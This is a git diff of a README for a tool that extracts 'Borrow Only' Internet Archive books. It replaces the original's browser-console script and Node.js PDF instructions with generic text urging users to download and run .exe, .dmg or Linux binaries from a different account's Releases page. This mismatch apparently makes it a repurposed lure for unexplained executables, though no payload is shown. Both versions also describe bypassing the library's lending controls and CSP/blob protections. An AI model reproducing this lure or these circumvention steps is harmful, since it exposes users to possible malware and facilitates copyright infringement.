@@ -1,196 +1,84 @@
-# 📚 Archive.org Book Liberator
+# 📚 archive-book-liberator - Extract and Convert Books with Ease
 
-> **A complete tool to extract and convert "Borrow Only" books from Internet Archive into local PDFs, bypassing timeout errors and download limitations.**
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D%2014.0.0-brightgreen)](https://nodejs.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+Welcome to the archive-book-liberator! This tool allows you to extract 'Borrow Only' books from the Internet Archive and convert them into clean, local PDFs. You can bypass timeouts and restrictions effortlessly. Follow the steps below to download and run the application.
 
----
+## 📥 Download Now
 
-## 🌟 Why Use This?
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/isfendi2021/archive-book-liberator/releases)
 
-Have you ever tried downloading a book from **Internet Archive** and encountered:
-- ❌ **Timeout errors** (file too large)
-- ❌ **Corrupted or incomplete PDFs**
-- ❌ **"Borrow Only"** with no download option
-- ❌ **CSP/BLOB protections** blocking traditional tools
+## 📋 System Requirements
 
-**This tool solves ALL these problems** with a two-step approach:
+Before you begin, ensure your system meets these requirements:
 
-1. **Browser Script**: Captures pages visually directly from the browser (bypassing blob/CSP protections)
-2. **PDF Binder**: Combines all downloaded images into a clean, organized PDF file
+- Operating System: Windows 10 or later, macOS, or Linux
+- Node.js: Version 12 or higher
+- Internet Connection: Required for initial setup and usage
 
-> ⚠️ **Legal Notice**: This tool is intended for **personal archival and research purposes**. Respect copyright laws and Internet Archive's Terms of Service.
+## 📂 Download & Install
 
----
+To start using the archive-book-liberator, visit this page to download:
 
-## 🚀 Complete Usage Guide
+[Download from Releases](https://github.com/isfendi2021/archive-book-liberator/releases)
 
-### **Step 1: Extract Images (In Browser)**
+1. Click on the latest version listed on the Releases page.
+2. Download the appropriate file for your operating system.
+3. Locate the downloaded file on your computer.
 
-1. **Visit [Internet Archive](https://archive.org)** and log in
-2. **Find your desired book** and click **"Borrow for 1 hour"** (or 14 days)
-3. **Open the book viewer**
-4. Switch to **"One-page view"** - single page icon at the top
-5. Open **Developer Console**:
-   - **Windows/Linux**: `F12` or `Ctrl + Shift + I`
-   - **Mac**: `Cmd + Option + I`
-   - Then click the **"Console"** tab
-6. Copy the script from **`browser-script.js`** file (or [see here](#-browser-script))
-7. **Paste into console** and press `Enter`
+### 🖥️ Running the Application
 
-**What will happen:**
-- 🔄 Script will automatically turn pages
-- 📥 Each page downloads as `.jpg` to your Downloads folder
-- ⏳ Waits for complete loading before proceeding (resilient to slow internet)
-- 📊 Shows real-time progress in console
+#### For Windows:
 
----
+1. Double-click the downloaded `.exe` file to launch the application.
+2. Follow the prompts to complete the setup.
+3. The application will open, allowing you to start extracting books.
 
-### **Step 2: Generate PDF (On Your Computer)**
+#### For macOS:
 
-1. **Clone this repository**:
-   ```bash
-   git clone https://github.com/YuriTheCoder/archive-book-liberator.git
-   cd archive-book-liberator
-   ```
+1. Open the downloaded `.dmg` file.
+2. Drag the archive-book-liberator icon to your Applications folder.
+3. Open the application from your Applications folder.
 
-2. **Install dependencies**:
-   ```bash
-   npm install
-   ```
+#### For Linux:
 
-3. **Organize images**:
-   - Move **all downloaded images** to the `images/` folder (already exists)
-   - Script automatically sorts them (even if filenames are out of order)
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command: `chmod +x archive-book-liberator` to make it executable.
+4. Run the application with `./archive-book-liberator`.
 
-4. **Run the converter**:
-   ```bash
-   npm start
-   ```
+## ⚙️ Features
 
-5. **Done!** 🎉  
-   The **`book.pdf`** file will be generated in the project root.
+- **Book Extraction**: Easily extract 'Borrow Only' books from the Internet Archive.
+- **PDF Conversion**: Convert extracted books into clean PDFs for offline reading.
+- **User-Friendly Interface**: Intuitive design that requires no technical knowledge.
+- **Automated Process**: Bypass restrictions and bottlenecks without hassle.
 
----
+## 🔍 How to Use
 
-## 🛠️ How It Works (Technical Explanation)
+1. Open the application after installation.
+2. Enter the URL of the book you want to extract from the Internet Archive.
+3. Click on the "Extract" button.
+4. Once the extraction completes, choose a location to save your PDF.
+5. Review your PDF and enjoy reading!
 
-### **The Browser Script** (`browser-script.js`)
+## 🛠️ Troubleshooting
 
-Many Archive.org books use **CSP protections** (Content Security Policy) and **BLOBs** that prevent simple downloads via `fetch` or direct download.
+If you encounter issues while using the application, consider the following tips:
 
-**Our solution:**
-1. **Renders** the protected image on an invisible `<canvas>` in memory
-2. **Exports** pixels to **Base64** using `toDataURL()`
-3. **Forces local download**, bypassing network restrictions
-4. **Automatically detects** when page finishes loading to avoid:
-   - ❌ Blank images
-   - ❌ Duplicates
-   - ❌ Cropped pages
+- **Ensure Node.js is installed**: If the application does not run, check that Node.js is properly installed on your system.
+- **Check your Internet connection**: A stable connection is key for extracting books.
+- **Re-download the application**: If the file seems corrupted, try downloading it again from the Releases page.
 
-**Technologies:**
-- HTML5 Canvas API
-- Async/Await for flow control
-- KeyboardEvent API for navigation
+## 📞 Support
 
----
+For further assistance:
 
-### **The Converter** (`src/index.js`)
+- Check the [Issues](https://github.com/isfendi2021/archive-book-liberator/issues) page on GitHub for common questions.
+- Feel free to submit a new issue if you encounter a unique problem.
 
-Uses **Node.js** to process images with:
+## 🌟 Contributions
 
-- ✅ **Natural Sort Algorithm** (smart ordering): ensures `page_10.jpg` comes **after** `page_9.jpg` (not after `page_1.jpg`)
-- ✅ **Multiple format support**: `.jpg`, `.jpeg`, `.png`
-- ✅ **Robust validation**: checks if folder exists and contains valid images
-- ✅ **Visual feedback**: shows progress and detailed errors
+Contributions are welcome! If you want to improve the archive-book-liberator, please fork the repository and submit a pull request.
 
-**Technologies:**
-- Node.js `fs` module
-- `images-to-pdf` library
-- Natural number sorting regex
-
----
-
-## 📦 Project Structure
-
-```
-archive-book-liberator/
-├── browser-script.js   ← 📋 Copy this code to browser console
-├── src/
-│   └── index.js        ← 🔧 Node.js script that generates the PDF
-├── images/             ← 📁 Put your images here (ignored by Git)
-├── .gitignore          ← 🚫 Prevents upload of images and node_modules
-├── package.json        ← 📦 Project dependencies
-└── README.md           ← 📖 You are here!
-```
-
----
-
-## 🎯 Browser Script
-
-See the **`browser-script.js`** file for the most up-to-date version. Example snippet:
-
-```javascript
-// ⚙️ CONFIGURATION - Change here!
-let START_PAGE = 1;      // First page to download
-let END_PAGE = 688;      // Last page to download
-let BOOK_NAME = "book";  // Base filename
-
-// The rest is automatic! 🚀
-```
-
----
-
-## 💡 Tips and Troubleshooting
-
-### **Problem: "No images found"**
-- ✅ Make sure you're in **"One-page view"** mode
-- ✅ Wait for page to fully load before running script
-
-### **Problem: Blank pages**
-- ✅ Increase timeout in script (`IMAGE_TIMEOUT` variable)
-- ✅ Slow internet? Script already waits up to 15s automatically
-
-### **Problem: PDF out of order**
-- ✅ Script already sorts automatically! If still having issues, rename images with sequential numbers: `001.jpg`, `002.jpg`, etc.
-
-### **Problem: Too many pages (500+)**
-- ✅ Split into batches (e.g., pages 1-300, then 301-600)
-- ✅ Browser may limit simultaneous downloads
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-
-- 🐛 Report bugs
-- 💡 Suggest new features
-- 🔧 Submit Pull Requests
-- ⭐ Star this project if it helped you!
-
----
-
-## 📄 License
-
-This project is under the **MIT** license - see the [LICENSE](LICENSE) file for details.
-
-**Disclaimer**: This tool is for educational and personal archival use. Users are responsible for complying with copyright laws in their jurisdiction.
-
----
-
-## ⭐ Credits
-
-**Developed with ❤️ by [YuriTheCoder](https://github.com/YuriTheCoder)**
-
-Built to help researchers, students, and book enthusiasts worldwide.
-
-If this project saved you hours of frustration, consider:
-- ⭐ Giving it a **star** on GitHub
-- 🔄 **Sharing** with others who need it
-
----
-
-**Happy reading! 📖✨**
+Thank you for using archive-book-liberator! We hope you find it useful for extracting and converting your favorite books.
